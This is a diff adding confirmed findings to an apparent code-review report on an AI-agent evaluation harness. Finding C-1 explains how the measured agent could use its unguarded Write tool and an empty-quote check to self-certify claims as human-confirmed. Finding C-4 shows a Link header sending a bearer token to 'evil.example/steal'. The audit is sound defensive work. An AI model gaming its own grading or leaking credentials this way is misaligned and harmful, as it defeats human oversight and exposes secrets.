@@ -824,3 +824,168 @@ SEVERITY: Minor — confirmed by grep; both invoked CLIs write only to stderr to
 is latent.
 
 **server-13 onward** — pending; truncated in delivery.
+
+## Confirmed defects
+
+Every severity below was settled against a named artifact. Where settling changed a
+reviewer's estimate, that is stated — three findings were downgraded and two escalated,
+and the escalations were only visible by combining slices.
+
+### Critical
+
+**C-1. An agent can fabricate the evidence that grades it, in every arm.**
+Assembled from `server-01`, `server-04`, `server-06` and settled here. No single reviewer
+could see this: the tools half is in the `runner` slice, the sign-off half in the `server`
+slice, and the promotion rule in `core`.
+
+The chain, each link confirmed:
+
+1. `arms.py:21` — `READ_TOOLS = ("Read", "Edit", "Write", "Grep", "Glob")`. Despite the
+   name, it contains `Edit` and `Write`, and `arms.py:46,53,60` give it to **all three
+   arms**.
+2. `enforcement.py:208` — the `PreToolUse` guard's matcher is `"Bash"`. Only Bash is
+   confined. The module's own docstring (`:1-9`) records that `--allowedTools` cannot
+   constrain a built-in tool, so `Write` is unguarded by construction.
+3. The agent can therefore write any file into its workspace, including
+   `interviews/<anything>`.
+4. `questions.py:157` — `answer-record` accepts a caller-named transcript; `answered_by`
+   is free text; `author_confirmed_exact_text` is caller-supplied.
+5. `questions.py:163` — the only check that an answer happened is
+   `quote not in transcript_path.read_text()`, and `"" in anything` is True, so an empty
+   quote passes.
+6. `questions.py:198-200` — one `author_confirmed_exact_text` boolean writes
+   `signed_off_by` to **every** claim on the question.
+7. `promotion.py:70` — `if claim.signed_off_by: return Status.CONFIRMED`.
+
+So the agent under measurement can raise any claim to `confirmed` — the top status, and
+the one the headline metric counts — on evidence it authored itself, without a human
+existing. The package README names developer sign-off as one of only two mechanisms that
+can move `checked_fraction` off zero; this is the other end of that same lever.
+SEVERITY: Critical — confirmed against `arms.py:21,46,53,60` (Write in every arm),
+`enforcement.py:208` (matcher `"Bash"` only), and `promotion.py:70`. The `server`
+reviewer filed this as "Critical if the runner grants the agent Write or Bash into the
+workspace; Important otherwise"; the condition is satisfied for all three arms.
+
+**C-2. `pipeline run` never validates the manifest.** (`core-01`)
+`next_stage` skips `RECOMPUTED` stages (`pipeline/state.py:307`) and both `check` and
+`gate` are `RECOMPUTED` (`:276,279`), so a default run goes from `views` to `prose`
+without validating anything. `State.RECOMPUTED`'s own docstring at `:46-49` says the
+opposite — "the runner just performs it".
+SEVERITY: Critical — confirmed against a probe workspace holding a manifest whose stored
+`confirmed` rests on one ADR anchor: `pipeline run <ws> --strict --json` exits 0 with
+`performed: []`, while `pipeline run <ws> --from check --strict` on the same workspace
+exits 3 and reports the violation. Settled further during this review: commit `a20cc9a7b`
+("pipeline run performs six of the eight commands, not four", 13:39:50 today) changed
+**documentation only** — five doc and `__init__`/`entrypoints` files, no behaviour — so it
+aligned the prose to the skip and left the enum's contradictory docstring standing.
+
+**C-3. A failed checkpoint is unrecoverable without manual `rm -rf`.** (`core-02`)
+`write_checkpoint` creates the directory and writes `manifest.yaml` before reading
+`timeline.json` (`draft/checkpoint.py:74-98`), so a failure there leaves a directory
+`:69` then refuses to overwrite forever, and `pipeline/state.py:221-224` counts it
+unfrozen and routes the operator back into the refused stage.
+SEVERITY: Critical — confirmed: first run exits 1 leaving `['manifest.yaml']`; after
+repairing the input the retry exits 1 with "already exists; a checkpoint is written once".
+
+**C-4. The GitHub pagination loop sends the bearer token to a host the remote chooses.**
+(`evidence-02`)
+`_paginated_github` (`forge/fetch.py:131-135`) takes the next URL from the remote's `Link`
+header and hands it to `_get_json`, which attaches `Authorization` (`:109-110`) with no
+host check. The loop is also unbounded.
+SEVERITY: Critical — confirmed against an injected-transport run: a page-1
+`Link: <https://evil.example/steal>; rel="next"` produced a second request to
+`https://evil.example/steal` carrying `Authorization: Bearer SECRET-TOKEN`.
+
+**C-5. Re-running `audit` or `analyze` fabricates integrity violations and destroys the
+evidence.** (`runner-01`)
+Nothing compares a frozen campaign's recorded `git`/`prompt_sha256`/`plugin_root` against
+the running checkout, while every constant that classifies a transcript is a literal that
+moves with a rename. `cli.analyze` calls `audit_campaign` first, rewriting all six
+`audit/*.json` in place, then crashes before regenerating the analysis.
+SEVERITY: Critical — confirmed against
+`~/arfc-experiments/campaigns/pilot-aioquic-w02-11-20260831`: stored audits show
+`integrity: true`, while today's code recomputes `integrity: false` from the identical
+bytes — 177 fabricated out-of-arm entries for B1, 41 for C1, 170 for A1, and arm A drops
+out of the summary entirely. See the operational hazard above.
+
+**C-6. Recording a question with an explicit id silently overwrites a recorded human
+answer.** (`server-02`)
+`question_id` is checked for collision nowhere (`questions.py:62-67`), and
+`dump_questions` keys by id (`draft/questions.py:152`), so the write succeeds, reports
+success, and the previous entry — including a human answer — is gone.
+SEVERITY: Critical — confirmed against `draft/questions.py:152`.
+
+### Important
+
+`core-03` duplicate requirement ids silently drop a claim · `core-05`/S-5 the normative
+gate compares ids not content · `core-06` a YAML syntax error escapes every handler ·
+`core-07` `completeness` exits 1 where `gate` exits 3 on the same input · `core-08` four
+`clusters.jsonl` readers, three unguarded · `core-09` `signed_off_by` accepts `"   "` ·
+`core-14` the suite is blind to every one of core-01..core-09 · `evidence-04` provenance
+records the ref as typed, not the resolved sha · `evidence-05` the test guarding it cannot
+fail · `evidence-06` corpus JSON errors escape the contract · `evidence-07` a malformed
+record leaves a permanently-refused snapshot · `evidence-09` `fidelity_ceiling` grades on
+token presence, not observed denials · `evidence-13` the fixture cannot observe
+evidence-01 · `server-04` one boolean signs off every claim on a question · `server-05` a
+re-worded claim inherits its old sign-off · `server-07` gates return a previous run's
+report unmarked · `server-08` the CLI arm writes `testable: 'false'` where MCP writes
+`false` · `tests-01` the parity gate passes on a name alone · `tests-02` parity.md claims
+16 pairs are asserted; 5 are · S-1 the 200-row corpus cap is invisible in the return value
+· S-2 the transcript path is unsanitized, absolute paths included · S-3 no `urlopen`
+timeout · S-6 `--verify` compares only `patches`.
+
+**Escalated by settling.** `evidence-08` — views cannot be traced to the forge snapshot
+they came from, and `--verify` cannot detect a swap. The reviewer filed it as "Important
+if more than one snapshot exists for a target; Minor otherwise".
+SEVERITY: Important — confirmed: `reconstructions/` holds two MARK snapshots,
+`snapshot-2026-08-25T15-38-20Z` and `snapshot-2026-09-01T09-35-27Z`.
+
+**Downgraded by settling.** `evidence-03` — `api_base` ignores `self.host` for
+`kind == "github"`, so `GITHUB_TOKEN` would go to api.github.com against a GitHub
+Enterprise host. Filed as "Critical if GITHUB_TOKEN is set while `--host github` targets a
+non-github.com host".
+SEVERITY: Important — confirmed: every recorded snapshot's `meta.json` is either
+github.com or a GitLab host whose `api_base` correctly matches it
+(`gitlab.cylab.be` → `https://gitlab.cylab.be/api/v4`). The code defect is real; no
+recorded invocation reaches it. It remains a trap for the first GitHub Enterprise target.
+
+### Minor
+
+`core-10` a spurious second finding when a predecessor tag is unreadable · `core-11`
+`--until` before `--from` performs nothing and exits 0 · `core-12` a documented exit 1
+that cannot occur · `evidence-12` `history/aggregates.py` is dead code, 56 lines ·
+`evidence-14` an undeclared connection leak on the missing-JSONL path · `evidence-15`
+GitLab pagination `ValueError` and unbounded loop · `evidence-16` `\x01` in a path is
+parsed as a commit marker · `evidence-17` duplicate landing shas collapse silently ·
+`evidence-18` three small items · `server-11` the duplicate-question guard blocks only
+subsets · `server-12` `_run` discards stdout · `tests-03`..`tests-06` substring assertions
+that cannot distinguish which rule fired · the `claim_ids_of` docstring names a caller
+that does not exist.
+
+**Downgraded by settling.** `core-04` — `commit` is only `str()`-coerced, so `commit: HEAD`
+or a branch name verifies against a moving reference while looking pinned. Filed as
+"Critical if any authored manifest carries a non-40-hex commit; Minor otherwise".
+SEVERITY: Minor — confirmed against every `manifest.yaml` under `reconstructions/`: one
+distinct commit value, `b901f36095d746ee99dfa85b3d2ad1fbe5f2c533`, 40 hex characters. The
+hazard is real and untested (`test_anchors.py:22` only ever pins a resolved sha), but no
+authored manifest exercises it.
+
+`core-13` — `testable` is stored without a type check. Filed as "Minor if no consumer
+branches on it; Important otherwise — settled by grepping the harness".
+SEVERITY: Minor — settled from the other side by the `server` reviewer, who established
+that nothing reads `testable` today (`server-08`). The two reviewers reached the same
+conclusion independently from opposite slices.
+
+### Unsettled — reported as conditional, not confirmed
+
+- `evidence-01` (merge commits carry `file_count=0` while their own first-parent diff is
+  non-empty, and `file_count` is documented as "the true number of paths"). Critical if
+  any merge on a target's spine has a non-empty first-parent diff. Needs a real clone,
+  which this session could not reach. **This is the highest-value unsettled item**: the
+  reviewer confirmed the mechanism against a purpose-built repository, so only the
+  question of whether real targets exercise it remains.
+- `server-22` (an `mcp>=1.0` lower bound) — PyPI is unreachable through the sandbox proxy.
+- `runner-02`, `runner-03` — both settle on a `hook_response.exit_code` tally that no run
+  currently performs.
+- `evidence-10`, `evidence-11`, `server-09`, `server-10` — each carries its settling check
+  in its severity line.
